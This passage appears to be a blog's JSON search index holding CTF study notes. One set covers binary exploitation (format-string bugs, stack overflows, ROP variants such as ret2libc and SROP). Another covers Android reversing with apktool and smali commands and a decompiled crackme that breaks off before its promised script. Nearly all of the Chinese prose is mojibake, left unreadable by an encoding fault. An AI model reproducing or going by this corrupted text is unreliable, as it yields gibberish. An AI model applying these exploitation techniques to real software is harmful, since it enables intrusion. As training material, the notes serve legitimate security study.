è·³å‡ºheapèŒƒå›´ æ„é€ overlap chunk","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"XMan PWNï¼ˆä¸€ï¼‰","slug":"XMan-PWNï¼ˆä¸€ï¼‰","date":"2018-08-05T03:33:27.000Z","updated":"2018-08-08T05:28:51.905Z","comments":true,"path":"2018/08/05/XMan-PWNï¼ˆä¸€ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/05/XMan-PWNï¼ˆä¸€ï¼‰/","excerpt":"ä¸ä½¬tqlï¼Œæˆ‘å®Œå…¨pwnä¸èµ·æ¥ã€‚","text":"ä¸ä½¬tqlï¼Œæˆ‘å®Œå…¨pwnä¸èµ·æ¥ã€‚ å› ä¸ºè‡ªå·±åŸºç¡€ä¸å¤ªå¥½ï¼Œè·Ÿç€ctf wikiå­¦ä¹ ä¸€äº›åŸºç¡€çš„çŸ¥è¯†ä½œä¸ºè¡¥å……ã€‚ è°ƒç”¨çº¦å®š x86: stack x64: rdi, rsi, rdx, rcx, r8, r9, stack ç³»ç»Ÿè°ƒç”¨ x86: eax - syscall =&gt; ebx, ecx, edx x64: rax - syscall =&gt; rdi, rsi, rdx, rcx, r8, r9 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°ã€‚é€šä¿—æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å°±æ˜¯å°†è®¡ç®—æœºå†…å­˜ä¸­è¡¨ç¤ºçš„æ•°æ®è½¬åŒ–ä¸ºæˆ‘ä»¬äººç±»å¯è¯»çš„å­—ç¬¦ä¸²æ ¼å¼ã€‚å‡ ä¹æ‰€æœ‰çš„C/C++ç¨‹åºéƒ½ä¼šåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ¥è¾“å‡ºä¿¡æ¯ï¼Œè°ƒè¯•ç¨‹åºï¼Œæˆ–è€…å¤„ç†å­—ç¬¦ä¸²ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨åˆ©ç”¨çš„æ—¶å€™ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ† æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•° æ ¼å¼åŒ–å­—ç¬¦ä¸² åç»­å‚æ•°ï¼Œå¯é€‰ æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°è¾“å…¥ scanf è¾“å‡º printfï¼šè¾“å‡ºåˆ°stdout fprintfï¼šè¾“å‡ºåˆ°æŒ‡å®šFILEæµ vprintfï¼šæ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ° stdout vfprintfï¼šæ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ°æŒ‡å®šFILEæµ sprintfï¼šè¾“å‡ºåˆ°å­—ç¬¦ä¸² snprintfï¼šè¾“å‡ºæŒ‡å®šå­—èŠ‚æ•°åˆ°å­—ç¬¦ä¸² vsprintfï¼šæ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ°å­—ç¬¦ä¸² vsnprintfï¼šæ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºæŒ‡å®šå­—èŠ‚åˆ°å­—ç¬¦ä¸² setproctitleï¼šè®¾ç½®argv syslogï¼šè¾“å‡ºæ—¥å¿— errã€verrã€warnã€vwarnç­‰ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ ¼å¼ %d - åè¿›åˆ¶ - è¾“å‡ºåè¿›åˆ¶æ•´æ•° %s - å­—ç¬¦ä¸² - ä»å†…å­˜ä¸­è¯»å–å­—ç¬¦ä¸² %x - åå…­è¿›åˆ¶ - è¾“å‡ºåå…­è¿›åˆ¶æ•° %c - å­—ç¬¦ - è¾“å‡ºå­—ç¬¦ %p - æŒ‡é’ˆ - æŒ‡é’ˆåœ°å€ %n - åˆ°ç›®å‰ä¸ºæ­¢æ‰€å†™çš„å­—ç¬¦æ•° æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ ç¨‹åºå´©æºƒ æ³„æ¼å†…å­˜ è¦†ç›–å†…å­˜ å°æŠ€å·§ åˆ©ç”¨%xæ¥è·å–å¯¹åº”æ ˆçš„å†…å­˜ï¼Œä½†å»ºè®®ä½¿ç”¨%pï¼Œå¯ä»¥ä¸ç”¨è€ƒè™‘ä½æ•°çš„åŒºåˆ«ã€‚ åˆ©ç”¨%sæ¥è·å–å˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡æœ‰é›¶æˆªæ–­ã€‚ åˆ©ç”¨%order$xæ¥è·å–æŒ‡å®šå‚æ•°çš„å€¼ï¼Œåˆ©ç”¨%order$sæ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”åœ°å€çš„å†…å®¹ã€‚ æ ˆæº¢å‡ºæ¼æ´æ ˆæº¢å‡ºæŒ‡çš„æ˜¯ç¨‹åºå‘æ ˆä¸­æŸä¸ªå˜é‡ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´ä¸å…¶ç›¸é‚»çš„æ ˆä¸­çš„å˜é‡çš„å€¼è¢«æ”¹å˜ã€‚è¿™ç§é—®é¢˜æ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºæ¼ï¼Œç±»ä¼¼çš„è¿˜æœ‰å †æº¢å‡ºï¼Œbss æ®µæº¢å‡ºç­‰æº¢å‡ºæ–¹å¼ã€‚æ ˆæº¢å‡ºæ¼æ´è½»åˆ™å¯ä»¥ä½¿ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿä¸éš¾å‘ç°ï¼Œå‘ç”Ÿæ ˆæº¢å‡ºçš„åŸºæœ¬å‰ææ˜¯ï¼š ç¨‹åºå¿…é¡»å‘æ ˆä¸Šå†™å…¥æ•°æ®ã€‚ å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ã€‚ 32ä½ä¸64ä½ç¨‹åºçš„åŒºåˆ«ï¼š x86ï¼šå‡½æ•°å‚æ•°åœ¨å‡½æ•°è¿”å›åœ°å€çš„ä¸Šæ–¹ x64ï¼šSystem V AMD64 ABI (Linuxã€FreeBSDã€macOS ç­‰é‡‡ç”¨)ä¸­å‰å…­ä¸ªæ•´å‹æˆ–æŒ‡é’ˆå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨RDIã€ RSIã€RDXã€RCXã€R8å’ŒR9å¯„å­˜å™¨ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Šï¼›å†…å­˜åœ°å€ä¸èƒ½å¤§äº 0x00007FFFFFFFFFFFï¼Œ6ä¸ªå­—èŠ‚é•¿åº¦ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ å¯»æ‰¾å±é™©å‡½æ•°é€šè¿‡å¯»æ‰¾å±é™©å‡½æ•°ï¼Œæˆ‘ä»¬å¿«é€Ÿç¡®å®šç¨‹åºæ˜¯å¦å¯èƒ½æœ‰æ ˆæº¢å‡ºï¼Œä»¥åŠæœ‰çš„è¯ï¼Œæ ˆæº¢å‡ºçš„ä½ç½®åœ¨å“ªé‡Œã€‚å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹ è¾“å…¥ getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥â€™\\x00â€™ scanf vscanf è¾“å‡º sprintf å­—ç¬¦ä¸² strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ°â€™\\x00â€™åœæ­¢ strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ°â€™\\x00â€™åœæ­¢ bcopy ç¡®å®šå¡«å……é•¿åº¦è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®¡ç®—æˆ‘ä»¬æ‰€è¦æ“ä½œçš„åœ°å€ä¸æˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€çš„è·ç¦»ã€‚å¸¸è§çš„æ“ä½œæ–¹æ³•å°±æ˜¯æ‰“å¼€IDAï¼Œæ ¹æ®å…¶ç»™å®šçš„åœ°å€è®¡ç®—åç§»ã€‚ä¸€èˆ¬å˜é‡ä¼šæœ‰ä»¥ä¸‹å‡ ç§ç´¢å¼•æ¨¡å¼ ç›¸å¯¹äºæ ˆåŸºåœ°å€çš„çš„ç´¢å¼•ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æŸ¥çœ‹EBPç›¸å¯¹åç§»è·å¾— ç›¸å¯¹åº”æ ˆé¡¶æŒ‡é’ˆçš„ç´¢å¼•ï¼Œä¸€èˆ¬éœ€è¦è¿›è¡Œè°ƒè¯•ï¼Œä¹‹åè¿˜æ˜¯ä¼šè½¬æ¢åˆ°ç¬¬ä¸€ç§ç±»å‹ã€‚ ç›´æ¥åœ°å€ç´¢å¼•ï¼Œå°±ç›¸å½“äºç›´æ¥ç»™å®šäº†åœ°å€ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šæœ‰å¦‚ä¸‹çš„è¦†ç›–éœ€æ±‚ï¼š è¦†ç›–å‡½æ•°è¿”å›åœ°å€ï¼Œè¿™æ—¶å€™å°±æ˜¯ç›´æ¥çœ‹EBPå³å¯ã€‚ è¦†ç›–æ ˆä¸ŠæŸä¸ªå˜é‡çš„å†…å®¹ï¼Œè¿™æ—¶å€™å°±éœ€è¦æ›´åŠ ç²¾ç»†çš„è®¡ç®—äº†ã€‚ è¦†ç›–bssæ®µæŸä¸ªå˜é‡çš„å†…å®¹ã€‚ æ ¹æ®ç°å®æ‰§è¡Œæƒ…å†µï¼Œè¦†ç›–ç‰¹å®šçš„å˜é‡æˆ–åœ°å€çš„å†…å®¹ã€‚ ä¹‹æ‰€ä»¥æˆ‘ä»¬æƒ³è¦è¦†ç›–æŸä¸ªåœ°å€ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æƒ³é€šè¿‡è¦†ç›–åœ°å€çš„æ–¹æ³•æ¥ç›´æ¥æˆ–è€…é—´æ¥åœ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚ åŸºæœ¬ROPéšç€NXä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚æ”»å‡»è€…ä»¬ä¹Ÿæå‡ºæ¥ç›¸åº”çš„æ–¹æ³•æ¥ç»•è¿‡ä¿æŠ¤ï¼Œç›®å‰ä¸»è¦çš„æ˜¯ROP(Return Oriented Programming)ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ(gadgets)æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚æ‰€è°“gadgetså°±æ˜¯ä»¥retç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ ä¹‹æ‰€ä»¥ç§°ä¹‹ä¸ºROPï¼Œæ˜¯å› ä¸ºæ ¸å¿ƒåœ¨äºåˆ©ç”¨äº†æŒ‡ä»¤é›†ä¸­çš„retæŒ‡ä»¤ï¼Œæ”¹å˜äº†æŒ‡ä»¤æµçš„æ‰§è¡Œé¡ºåºã€‚ROPæ”»å‡»ä¸€èˆ¬å¾—æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚ å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„gadgetsä»¥åŠç›¸åº”gadgetsçš„åœ°å€ã€‚ å¦‚æœgadgetsæ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€äº†ã€‚ ret2textret2textå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç (.text)ã€‚å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç (ä¹Ÿå°±æ˜¯gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ROPã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“å¯¹åº”è¿”å›çš„ä»£ç çš„ä½ç½®ã€‚å½“ç„¶ç¨‹åºä¹Ÿå¯èƒ½ä¼šå¼€å¯æŸäº›ä¿æŠ¤ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å»ç»•è¿‡è¿™äº›ä¿æŠ¤ã€‚ ret2shellcoderet2shellcodeï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œ shellcodeä»£ç ã€‚shellcodeæŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸è§çš„åŠŸèƒ½ä¸»è¦æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„shellã€‚ä¸€èˆ¬æ¥è¯´ï¼Œshellcodeéœ€è¦æˆ‘ä»¬è‡ªå·±å¡«å……ã€‚è¿™å…¶å®æ˜¯å¦å¤–ä¸€ç§å…¸å‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œå³æ­¤æ—¶æˆ‘ä»¬éœ€è¦è‡ªå·±å»å¡«å……ä¸€äº›å¯æ‰§è¡Œçš„ä»£ç ã€‚ åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æƒ³æ‰§è¡Œshellcodeï¼Œéœ€è¦å¯¹åº”çš„binaryåœ¨è¿è¡Œæ—¶ï¼Œshellcodeæ‰€åœ¨çš„åŒºåŸŸå…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚ ret2syscallret2syscallï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚ ret2libcret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½®(å³å‡½æ•°å¯¹åº”çš„ gotè¡¨é¡¹çš„å†…å®¹)ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ/bin/shâ€)ï¼Œæ•…è€Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚ ELSEï¼šJOP(Jump Oriented Programming)/COP(Call Oriented Programming) ROPgadget ret2syscall, ret2libc, ret2csu, ret2reg -&gt; various gadget ret2vdso, ret2vsyscall -&gt; special gadget(mapping) ret2csu -&gt; (â€“depth 20) dl-resolveret2dlresolveï¼šæ²¡æœ‰libcåœ°å€ï¼Œéœ€è¦è°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼Œæ§åˆ¶äº†å·²çŸ¥åœ°å€å†…å®¹ã€‚ PLT &amp; GOT PLT(Global Offset Table): push index; call GOT; jmp PLT[0] GOT(Procedure Link Table): jmp PLT[0] https://blog.csdn.net/linyt/article/details/51635768https://blog.csdn.net/linyt/article/details/51636753https://blog.csdn.net/linyt/article/details/51637832https://blog.csdn.net/linyt/article/details/51893258 SROPï¼ˆSigreturn ROPï¼‰signal Control ax &amp; sp http://www.freebuf.com/articles/network/87447.html http://blog.leanote.com/post/3191220142@qq.com/SROP tricks stack pivotï¼šhttp://tacxingxing.com/2017/05/10/stack-pivot/ tls","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"XMan Androidï¼ˆä¸€ï¼‰","slug":"XMan-Androidï¼ˆä¸€ï¼‰","date":"2018-08-04T05:34:56.000Z","updated":"2018-10-07T09:46:22.524Z","comments":true,"path":"2018/08/04/XMan-Androidï¼ˆä¸€ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/04/XMan-Androidï¼ˆä¸€ï¼‰/","excerpt":"jrå¤§ä½¬å¸¦æˆ‘å­¦androidã€‚","text":"jrå¤§ä½¬å¸¦æˆ‘å­¦androidã€‚ Androidç”Ÿæ€åœˆ ç”±Googleé¢†å¯¼å¼€å‘ï¼ŒåŸºäºLinuxå†…æ ¸çš„å¼€æºæ“ä½œç³»ç»Ÿ ç¢ç‰‡åŒ–é—®é¢˜ä¸¥é‡ \u0007åº”ç”¨å¸‚åœºç®¡ç†ä¸ä¸¥æ ¼ å‚å•†å®‰å…¨è¡¥ä¸æ¨é€ä¸åŠæ—¶ï¼Œè¦†ç›–ç‡ä½ å¼€æ”¾ã€åˆ†äº«ã€å¯å®šåˆ¶åŒ–ç¨‹åº¦é«˜ Androidæ•´ä½“æ¶æ„ åº”ç”¨ç¨‹åºå±‚ Androidåº”ç”¨ç¨‹åºä»¥Javaä¸ºå¼€å‘è¯­è¨€ æ”¯æŒC/C++ Frameworkå±‚ ä¸ºåº”ç”¨ç¨‹åºå¼€å‘æä¾›API å¤§éƒ¨åˆ†ä½¿ç”¨Javaç¼–å†™ ä¾‹å¦‚ï¼šResource Manageã€Location Managerã€Telephony Manager Android Runtime æä¾›äº†Javaç¼–ç¨‹è¯­è¨€æ ¸å¿ƒåº“çš„å¤§å¤šæ•°åŠŸèƒ½ åº”ç”¨ç¨‹åºéƒ½å¯¹åº”ç‹¬ç«‹çš„è™šæ‹Ÿæœº ç³»ç»Ÿè¿è¡Œåº“ C/C++åº“ï¼Œä¸ºå¼€å‘è€…æä¾›æœåŠ¡ ä¾‹å¦‚ï¼šSQLiteã€Webkit ç¡¬ä»¶æŠ½è±¡å±‚ æŠŠAndroid frameworkä¸Linux kerneléš”å¼€ Linux Kerneléµå¾ªGPLåè®® é©±åŠ¨åˆ†ä¸ºuser spaceå’Œkernel space Linux Kernel ç¡¬ä»¶é©±åŠ¨ã€ç½‘ç»œã€æ–‡ä»¶ç³»ç»Ÿã€è¿›ç¨‹ç®¡ç† å¯¹kernelè¿›è¡Œäº†è®¸å¤šå…¶ä»–ä¿®æ”¹ Androidå®‰å…¨æ¨¡å‹åŸºäºLinuxçš„ç”¨æˆ·éš”ç¦» Linuxï¼šç”¨æˆ·è¢«åˆ†é…è‡ªå·±çš„UIDï¼Œç¨‹åºå¯ä»¥ä»¥æŒ‡å®šUIDè¿è¡Œ Androidï¼šæ¯ä¸ªåº”ç”¨ç¨‹åºéƒ½æœ‰UIDï¼ŒUIDè¢«ç”¨äºåŒºåˆ†åº”ç”¨ç¨‹åº åº”ç”¨æœ‰è‡ªå·±çš„æ•°æ®å­˜æ”¾ç›®å½• å­˜åœ¨å…±äº«UIDçš„ç‰¹æ®Šæƒ…å†µï¼ˆèµ„æºå…±äº«ï¼‰ åº”ç”¨æƒé™ ç»†ç²’åº¦æ§åˆ¶ï¼ˆç½‘ç»œã€ç¡¬ä»¶ã€æ•æ„Ÿæ•°æ®ï¼‰ åº”ç”¨é€šè¿‡Manifest.xmlç”³è¯·æƒé™ æƒé™æ£€æŸ¥å¯ä»¥ç”±å†…æ ¸è¿›è¡Œï¼Œä¹Ÿå¯ä»¥ç”±Androidç³»ç»Ÿæ‰§è¡Œ ä»£ç ç­¾å APKå¿…é¡»æœ‰å¼€å‘è€…çš„ç­¾å SELinux Security Enhancements for Android å¼ºåˆ¶è®¿é—®æ§åˆ¶ï¼ˆMACï¼‰ æ ¸å¿ƒç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹å’Œç”¨æˆ·åº”ç”¨éš”ç¦»åˆ°ä¸åŒdomain ç³»ç»Ÿæ›´æ–°ï¼ˆåˆ·æœºï¼‰ è§£é”ã€BootLoaderã€Recovery recoveryæ˜¯ä¸€ä¸ªå•ç‹¬å°å‹systemï¼Œå¯ä»¥è®¿é—®æ‰€æœ‰è®¾å¤‡åˆ†åŒº é€šå¸¸åªå…è®¸ç­¾åéªŒè¯é€šè¿‡çš„åˆ·å†™ è§£é”ï¼šå…è®¸æ›¿æ¢recoveryå’Œç³»ç»Ÿé•œåƒï¼ˆå°†ä¼šæ¸…é™¤æ‰€æœ‰ç”¨æˆ·æ•°æ®ï¼‰ APKæ–‡ä»¶ç»“æ„æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªzipå‹ç¼©åŒ…ï¼š Manifest.xmlï¼šå¯¹åº”ç”¨çš„æ•´ä½“æè¿°å’Œå®šä¹‰ META-INFï¼šä¿å­˜ç­¾åä¿¡æ¯ classes.dexï¼šJavaä»£ç ç¼–è¯‘åç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ resç›®å½•ï¼šå­˜æ”¾å¯ç¼–è¯‘èµ„æºæ–‡ä»¶ assetsç›®å½•ï¼šå­˜æ”¾åŸç”Ÿèµ„æºæ–‡ä»¶ libç›®å½•ï¼šå­˜æ”¾C/C++ä»£ç ç¼–è¯‘åçš„soæ–‡ä»¶ dexæ–‡ä»¶ Androidå¯æ‰§è¡Œæ–‡ä»¶ Javaä»£ç ç¼–è¯‘è€Œæ¥ åŒ…å«DalvikæŒ‡ä»¤é›† smaliiä»£ç ç”±å­—èŠ‚ç åæ±‡ç¼–å¾—åˆ°çš„å¯é˜…è¯»ä»£ç ã€‚æ¯ä¸€ä¸ªsmaliæ–‡ä»¶ä»£è¡¨ä¸€ä¸ªç±»ã€‚ .class &lt;æƒé™&gt;[ä¿®é¥°]&lt;ç±»å&gt; .super &lt;çˆ¶ç±»å&gt; .source &lt;æºæ–‡ä»¶å&gt; .field å­—æ®µå®šä¹‰ .method æ–¹æ³•å®šä¹‰ JNI Javaå’ŒNativeæ²Ÿé€šçš„æ¡¥æ¢ æ³¨å†Œï¼šé™æ€æ³¨å†Œå’ŒåŠ¨æ€æ³¨å†Œ JNI_OnLoadï¼šåŠ è½½soæ–‡ä»¶æ—¶æ‰§è¡Œ åŠ å£³æŠ€æœ¯ åç¼–è¯‘ä»£ä»·ä½ =&gt; åˆ©ç”¨åŠ¨æ€ä»£ç åŠ è½½æŠ€æœ¯ =&gt; éšè—åŸæœ¬çš„dexæ–‡ä»¶ åŠ¨æ€åŠ è½½è¿‡ç¨‹éšè”½ï¼Œä¸”å¤æ‚åº¦é«˜ å¢åŠ å®Œæ•´æ€§æ£€æŸ¥ï¼Œåè°ƒè¯•æªæ–½ Androidæä¾›çš„åŠ¨æ€åŠ è½½æ–¹æ³•ï¼š DexClassLoaderï¼šapk/jar/dexï¼Œå¯ä»¥ä»SDå¡åŠ è½½ PathClassLoaderï¼šåªèƒ½åŠ è½½å·²å®‰è£…åˆ°ç³»ç»Ÿä¸­ï¼ˆ/data/appï¼‰çš„apkæ–‡ä»¶ ç›¸å…³å·¥å…·åœ¨å‘½ä»¤è¡Œçš„ä½¿ç”¨apktoolè§£åŒ…apkæ–‡ä»¶ï¼š 1java -jar apktool_2.3.0.jar d *.apk -o [output file] æ‰“åŒ…apkæ–‡ä»¶ï¼š 1java -jar apktool_2.3.0.jar b [output file] smali/baksmalidexæ–‡ä»¶è½¬æ¢æˆsmaliæ–‡ä»¶ï¼š 1java -jar baksmali-2.1.3.jar -o [output file] *.dex smaliæ–‡ä»¶è½¬æ¢æˆdexæ–‡ä»¶ï¼š 1java -jar smali-2.1.3.jar -o *.dex [smali file] dex2jaråç¼–è¯‘apkæ–‡ä»¶ï¼š 1d2j-dex2jar.bat classes.dex com.j.crackme.apkæ‹–è¿›jadxï¼Œåœ¨MainActivityä¸­çœ‹å‡ºé€»è¾‘ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView((int) R.layout.activity_main); ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() &#123; public void onClick(View view) &#123; MainActivity.this.a(); EditText editText = (EditText) MainActivity.this.findViewById(R.id.edit_text); String obj = editText.getText().toString(); if (MainActivity.this.clazz != null) &#123; try &#123; if (Base64.encodeToString(((IMyClass) MainActivity.this.clazz.newInstance()).check(obj), 0).equals(\"+sfQ39PX3eGOzOGNyt/Kj90=\\n\")) &#123; Toast.makeText(MainActivity.this.getApplicationContext(), \"Good job\", 0).show(); editText.setText(String.format(\"flag&#123;%s&#125;\", new Object[]&#123;obj&#125;)); &#125; else &#123; Toast.makeText(MainActivity.this.getApplicationContext(), \"Why you say so\", 0).show(); &#125; &#125; catch (View view2) &#123; view2.printStackTrace(); &#125; &#125; &#125; &#125;); &#125; private void a() &#123; if (this.clazz == null &amp;&amp; c()) &#123; StringBuilder stringBuilder = new StringBuilder(); stringBuilder.append(getApplicationInfo().dataDir); stringBuilder.append(File.separator); stringBuilder.append(\"files\"); stringBuilder.append(File.separator); stringBuilder.append(\"plugin.jar\"); try &#123; this.clazz = new DexClassLoader(new File(stringBuilder.toString()).getAbsolutePath(), getApplicationInfo().dataDir, null, getClassLoader()).loadClass(\"com.j.base.MyClass\"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; private boolean c() &#123; try &#123; byte[] d = d(getAssets().open(\"plugin\")); if (d == null) &#123; return false; &#125; for (int i = 0; i &lt; d.length; i++) &#123; d[i] = (byte) (d[i] ^ 239); &#125; BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(openFileOutput(\"plugin.jar\", 0)); bufferedOutputStream.write(d); bufferedOutputStream.flush(); bufferedOutputStream.close(); return true; &#125; catch (Exception e) &#123; e.printStackTrace(); return false; &#125; &#125; public byte[] d(InputStream inputStream) &#123; try &#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byte[] bArr = new byte[AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT]; while (true) &#123; int read = inputStream.read(bArr); if (read != -1) &#123; byteArrayOutputStream.write(bArr, 0, read); &#125; else &#123; byteArrayOutputStream.flush(); byteArrayOutputStream.close(); inputStream.close(); return byteArrayOutputStream.toByteArray(); &#125; &#125; &#125; catch (InputStream inputStream2) &#123; inputStream2.printStackTrace(); return null; &#125; &#125; åœ¨onClickä¸­å…ˆè°ƒç”¨äº†a()ï¼Œç„¶ååœ¨a()ä¸­è°ƒç”¨äº†c()ã€‚c()ä¸­æ‰“å¼€äº†ç›®å½•ä¸‹çš„ä¸€ä¸ªpluginæ–‡ä»¶ï¼Œå¯¹å…¶é€å­—èŠ‚å’Œæ•°å­—239è¿›è¡Œå¼‚æˆ–ï¼Œç”Ÿæˆä¸€ä¸ªplugin.jarï¼Œç„¶åè°ƒç”¨å…¶ä¸­çš„check()å‡½æ•°ã€‚d()åˆ™ç”¨æ¥æ£€æµ‹è¯»å–æ–‡ä»¶æ˜¯å¦æ­£å¸¸ã€‚æ ¹æ®check()å¯¹è¾“å…¥å­—ç¬¦ä¸²åŠ å¯†åï¼Œå†ç»è¿‡Base64åŠ å¯†çš„å€¼ä¸+sfQ39PX3eGOzOGNyt/Kj90=\\nç›¸ç­‰å³æ­£ç¡®ã€‚ æ ¹æ®c()ï¼Œå†™å‡ºè¾“å‡ºplugin.jarçš„è„šæœ¬ï¼š 